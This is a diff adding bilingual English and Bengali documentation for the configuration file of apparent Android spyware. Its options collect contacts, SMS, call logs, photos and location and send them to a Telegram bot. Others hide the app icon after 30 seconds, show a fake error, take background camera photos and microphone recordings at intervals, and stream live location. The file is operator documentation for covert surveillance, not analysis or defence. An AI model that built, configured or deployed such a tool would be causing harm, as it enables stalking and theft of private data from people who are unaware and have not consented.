@@ -1,0 +1,67 @@
+# app_config.json Options (English & বাংলা)
+
+- **Boolean values:**
+  - **true**: (English) Enable/On
+  - **false**: (English) Disable/Off
+  - **true**: (বাংলা) চালু/সক্রিয়
+  - **false**: (বাংলা) বন্ধ/নিষ্ক্রিয়
+
+- **bot_token**: (string) Your Telegram bot token. Example: "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+  - **বর্ণনা:** (স্ট্রিং) আপনার টেলিগ্রাম বট টোকেন। উদাহরণ: "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+
+- **chat_id**: (string or number) Telegram chat ID to send data to. Example: "123456789"
+  - **বর্ণনা:** (স্ট্রিং/নাম্বার) কোন চ্যাটে ডেটা পাঠানো হবে তার টেলিগ্রাম চ্যাট আইডি। উদাহরণ: "123456789"
+
+- **webview_url**: (string) URL to load in the app's WebView. Example: "https://www.google.com"
+  - **বর্ণনা:** (স্ট্রিং) অ্যাপের ওয়েবভিউতে যে URL লোড হবে। উদাহরণ: "https://www.google.com"
+
+- **require_permissions**: (boolean) If true, app will request all permissions at startup. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ চালু হলে সব পারমিশন চাইবে। উদাহরণ: true
+
+- **read_contacts**: (boolean) If true, app will collect contacts. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ কনট্যাক্ট সংগ্রহ করবে। উদাহরণ: true
+
+- **read_sms**: (boolean) If true, app will collect SMS messages. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ এসএমএস সংগ্রহ করবে। উদাহরণ: true
+
+- **read_call_log**: (boolean) If true, app will collect call logs. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ কল লগ সংগ্রহ করবে। উদাহরণ: true
+
+- **read_storage**: (boolean) If true, app will collect photos/media. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ ফটো/মিডিয়া সংগ্রহ করবে। উদাহরণ: true
+
+- **read_location**: (boolean) If true, app will collect device location. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ লোকেশন সংগ্রহ করবে। উদাহরণ: true
+
+- **post_notifications**: (boolean) If true, app will request notification permission. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ নোটিফিকেশন পারমিশন চাইবে। উদাহরণ: true
+
+- **stealth_mode**: (boolean) If true, app icon will hide after 30 seconds. Example: false
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ আইকন ৩০ সেকেন্ড পর লুকিয়ে যাবে। উদাহরণ: false
+
+- **fake_error**: (boolean) If true, app shows a fake error and closes UI. Example: false
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ একটি ভুয়া এরর দেখাবে এবং UI বন্ধ করবে। উদাহরণ: false
+
+- **background_camera_enabled**: (boolean) If true, app will take photos in the background. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ ব্যাকগ্রাউন্ডে ছবি তুলবে। উদাহরণ: true
+
+- **background_camera_front**: (boolean) If true, use front camera; if false, use rear camera. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে ফ্রন্ট ক্যামেরা, false হলে রিয়ার ক্যামেরা ব্যবহার হবে। উদাহরণ: true
+
+- **background_camera_back**: (boolean) If true, use back camera. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে ব্যাক ক্যামেরা ব্যবহার হবে। উদাহরণ: true
+
+- **background_camera_interval_sec**: (integer, seconds) How often to take background camera photos. Example: 30 = every 30 seconds, 60 = every 1 minute.
+  - **বর্ণনা:** (ইন্টিজার, সেকেন্ড) কত সময় পরপর ব্যাকগ্রাউন্ডে ছবি তোলা হবে। উদাহরণ: ৩০ = প্রতি ৩০ সেকেন্ডে, ৬০ = প্রতি ১ মিনিটে।
+
+- **microphone_enabled**: (boolean) If true, app will record audio from the microphone in the background. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ ব্যাকগ্রাউন্ডে মাইক্রোফোন থেকে অডিও রেকর্ড করবে। উদাহরণ: true
+
+- **microphone_interval_sec**: (integer, seconds) How often to record and send audio. Example: 30 = every 30 seconds, 60 = every 1 minute.
+  - **বর্ণনা:** (ইন্টিজার, সেকেন্ড) কত সময় পরপর অডিও রেকর্ড ও পাঠানো হবে। উদাহরণ: ৩০ = প্রতি ৩০ সেকেন্ডে, ৬০ = প্রতি ১ মিনিটে।
+
+- **live_location_enabled**: (boolean) If true, app will send live location to Telegram at intervals. Example: true
+  - **বর্ণনা:** (বুলিয়ান) true হলে অ্যাপ নির্দিষ্ট সময় পরপর লাইভ লোকেশন টেলিগ্রামে পাঠাবে। উদাহরণ: true
+
+- **live_location_interval_sec**: (integer, seconds) How often to send live location. Example: 30 = every 30 seconds, 60 = every 1 minute.
+  - **বর্ণনা:** (ইন্টিজার, সেকেন্ড) কত সময় পরপর লাইভ লোকেশন পাঠানো হবে। উদাহরণ: ৩০ = প্রতি ৩০ সেকেন্ডে, ৬০ = প্রতি ১ মিনিটে। 
